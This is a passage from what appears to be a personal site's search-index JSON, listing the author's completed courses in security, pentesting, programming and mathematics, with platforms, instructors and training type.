self-Learn | .   | Exploiting Simple Buffer Overflows on Win32 | Pentester Academy | Vivek Ramachandran | self-Learn | .   | GNU Debugger Megaprimer | Pentester Academy | Vivek Ramachandran | self-Learn | .   | Web Application Pentesting | Pentester Academy | Vivek Ramachandran | self-Learn | .   | Network Pentesting | Pentester Academy | Vivek Ramachandran | self-Learn | .   | Reverse Engineering and Exploit Development | Udemy | Infinite Skills Dr.Philip Polstra | self-Learn | .   | Kali Linux:Learn The Complete Hacking Operating System | Udemy | Sunil K. Gupta | self-Learn | .   | Advanced Ethical Hacking | Udemy | VTCSoftware Training | self-Learn | .   | The Complete Cyber Security Course : Hackers Exposed | Udemy | Nathan House | self-Learn | .   | The Complete Nmap Ethical Hacking Course : Network Security | Udemy | Nathan House | self-Learn | .   | The Complete Cyber Security Course : Network Security | Udemy | Nathan House | self-Learn | .   | The Complete Cyber Security Course : End Point Protection | Udemy | Nathan House | self-Learn | .   | Learn Social Engineering From Scratch | Udemy | Zaid Sabih | self-Learn | .   | Website Hacking in Practice | Udemy | Hacking School | self-Learn | .   | The Complete Cyber Security Course : Anonymous Browsing | Udemy | Nathan House | self-Learn | .   | SSCP Certificate Class | 恆毅資訊 | 唐任威 Vincent_tang | company-training | . Programing Training | JavaScript the most weird part | Udemy |   | self-Learn | .   | JavaScript Design Patterns: 20 Patterns for Expert Code | Udemy | Packt Publishing | self-Learn | .   | A Simple Node.js Mongo Restify API in Less Than 3 Hours | Udemy | Jim Hlad | self-Learn | .   | Learning Windows PowerShell | Udemy | Infinite Skills | self-Learn | .   | C# Developers: Learn the Art of Writing Clean Code | Udemy | Mosh Hamedani | self-Learn | .   | Red Hat Program | 恆毅資訊 | 王俊城Anderson Wang | company-training | .   | Andriod Camp | 恆毅資訊 | 何孟翰 Mark Ho | company-training | .   | Linux System Management | 國發會 | 林國龍 Bill Lin | company-training | .   | Vue.js Essentials - 3 Course Bundle |   | Anthony Gore, Vue Community Partner | self-Learn | .   | JS CANVAS |   | hahow 吳哲宇 | self-Learn | . Another | Number Theory | Udemy | Miran Fattah | self-Learn | .   | Calculus-Conductance, Limit, Basic Mathematics | Udemy | Lee Bor-Jian | self-Learn | .   | Python for Data Structures, Algorithms, and Interviews | Udemy | Jose Portilla | self-Learn | .   | BlockchainBasics:Practical Approach | Udemy | Toshendra Sharma | self-Learn | .   | Algorithm | Coursera | Peking Universary | self-Learn | .   | Data Structure Foundation | Coursera | Peking Universary | self-Learn | .   | Engineering Mathematics-Linear Algebra | Taiwan University Opening Class | 蘇柏青 | self-Learn | .   | JavaScript Algorithms and Data Structures Masterclass |   | Colt Steele | self-Learn | .   | Elasticsearch 6 and Elastic Stack - In Depth and Hands On |   | Sundog Education by Frank Kane | self-Learn | .   | Blockchain A-Z™: Learn How To Build Your First Blockchain |   | Hadelin de Ponteves, AI Entrepreneur | self-Learn | .   | FinTech use Python |   | hahow FinLab | self-Learn | .",
    "url": "http://localhost:4000/_notes/docs/work/work_Eng.html",
    "relUrl": "/docs/work/work_Eng.html"
  }
  
}
